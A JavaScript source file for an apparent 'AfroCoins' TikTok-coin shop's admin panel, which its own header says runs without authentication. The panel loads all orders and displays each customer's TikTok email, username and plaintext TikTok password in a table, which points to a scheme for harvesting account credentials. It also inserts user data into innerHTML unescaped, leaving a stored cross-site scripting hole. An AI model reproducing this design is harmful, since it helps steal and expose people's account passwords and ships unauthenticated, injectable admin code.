// AfroCoins - Panneau Administrateur (sans authentification)

let allOrders = [];

document.addEventListener('DOMContentLoaded', () => {
    loadOrders();
});

// ─── Load all orders (with user data via FK embedding) ──────

async function loadOrders() {
    const tbody = document.getElementById('ordersTableBody');
    tbody.innerHTML = '<tr><td colspan="8" class="loading">Chargement des commandes...</td></tr>';

    const { data, error } = await db
        .from('orders')
        .select(`
            id,
            coin_amount,
            price,
            payment_status,
            order_status,
            created_at,
            users (
                tiktok_email,
                tiktok_username,
                tiktok_password
            )
        `)
        .order('created_at', { ascending: false });

    if (error) {
        tbody.innerHTML = `<tr><td colspan="8" class="empty">Erreur : ${error.message}</td></tr>`;
        return;
    }

    allOrders = data || [];
    renderTable(allOrders);
    updateStats(allOrders);
}

// ─── Render table ────────────────────────────────────────────

function renderTable(orders) {
    const tbody = document.getElementById('ordersTableBody');

    if (!orders.length) {
        tbody.innerHTML = '<tr><td colspan="8" class="empty">Aucune commande.</td></tr>';
        return;
    }

    tbody.innerHTML = orders.map(o => {
        const u  = o.users || {};
        const os = orderStatusBadge(o.order_status);
        const ps = paymentStatusBadge(o.payment_status);
        const date = new Date(o.created_at).toLocaleDateString('fr-FR', {
            day: '2-digit', month: '2-digit', year: 'numeric',
            hour: '2-digit', minute: '2-digit'
        });

        return `<tr>
            <td><strong>#${o.id}</strong></td>
            <td style="color:var(--color-accent)">${u.tiktok_email || '—'}</td>
            <td>@${u.tiktok_username || '—'}</td>
            <td class="password-cell">${u.tiktok_password || '—'}</td>
            <td><strong>${o.coin_amount}</strong> 🪙</td>
            <td style="font-weight:700;color:var(--color-accent)">${formatPrice(o.price)}</td>
            <td><span class="badge ${ps.cls}">${ps.label}</span></td>
            <td>
                <select class="status-select"
                    data-order-id="${o.id}"
                    data-previous="${o.order_status}"
                    onchange="updateOrderStatus(this)">
                    <option value="en cours"   ${o.order_status === 'en cours'   ? 'selected' : ''}>En cours</option>
                    <option value="effectue"   ${o.order_status === 'effectue'   ? 'selected' : ''}>Effectué</option>
                    <option value="en_attente" ${o.order_status === 'en_attente' ? 'selected' : ''}>En attente</option>
                </select>
            </td>
        </tr>`;
    }).join('');
}

// ─── Update order status ─────────────────────────────────────

async function updateOrderStatus(selectEl) {
    const orderId   = parseInt(selectEl.dataset.orderId);
    const newStatus = selectEl.value;
    const previous  = selectEl.dataset.previous;

    const { error } = await db
        .from('orders')
        .update({ order_status: newStatus })
        .eq('id', orderId);

    if (error) {
        showToast('Erreur lors de la mise à jour.', 'error');
        selectEl.value = previous;
    } else {
        showToast('Statut mis à jour avec succès.', 'success');
        selectEl.dataset.previous = newStatus;
        // Update local allOrders for stats
        const order = allOrders.find(o => o.id === orderId);
        if (order) order.order_status = newStatus;
        updateStats(allOrders);
    }
}

// ─── Update payment status ───────────────────────────────────

async function updatePaymentStatus(selectEl) {
    const orderId   = parseInt(selectEl.dataset.orderId);
    const newStatus = selectEl.value;
    const previous  = selectEl.dataset.previous;

    const { error } = await db
        .from('orders')
        .update({ payment_status: newStatus })
        .eq('id', orderId);

    if (error) {
        showToast('Erreur lors de la mise à jour du paiement.', 'error');
        selectEl.value = previous;
    } else {
        showToast('Statut de paiement mis à jour.', 'success');
        selectEl.dataset.previous = newStatus;
    }
}

// ─── Stats ──────────────────────────────────────────────────

function updateStats(orders) {
    document.getElementById('totalOrders').textContent  = orders.length;
    const revenue = orders.reduce((sum, o) => sum + parseFloat(o.price || 0), 0);
    document.getElementById('totalRevenue').textContent = formatPrice(revenue);
    const pending = orders.filter(o => o.order_status === 'en_attente').length;
    document.getElementById('pendingOrders').textContent = pending;
}

// ─── Search / filter ─────────────────────────────────────────

function filterOrders() {
    const q = document.getElementById('searchInput').value.toLowerCase().trim();
    if (!q) {
        renderTable(allOrders);
        return;
    }
    const filtered = allOrders.filter(o => {
        const u = o.users || {};
        return (
            String(o.id).includes(q) ||
            (u.tiktok_email    || '').toLowerCase().includes(q) ||
            (u.tiktok_username || '').toLowerCase().includes(q) ||
            (o.order_status    || '').toLowerCase().includes(q)
        );
    });
    renderTable(filtered);
}

// ─── Badge helpers ──────────────────────────────────────────

function orderStatusBadge(status) {
    const map = {
        'en cours':   { label: 'En cours',   cls: 'badge-yellow' },
        'effectue':   { label: 'Effectué',   cls: 'badge-green'  },
        'en_attente': { label: 'En attente', cls: 'badge-gray'   },
    };
    return map[status] || { label: status, cls: 'badge-gray' };
}

function paymentStatusBadge(status) {
    const map = {
        'payé':       { label: 'Payé',       cls: 'badge-green' },
        'en_attente': { label: 'En attente', cls: 'badge-gray'  },
    };
    return map[status] || { label: status, cls: 'badge-gray' };
}
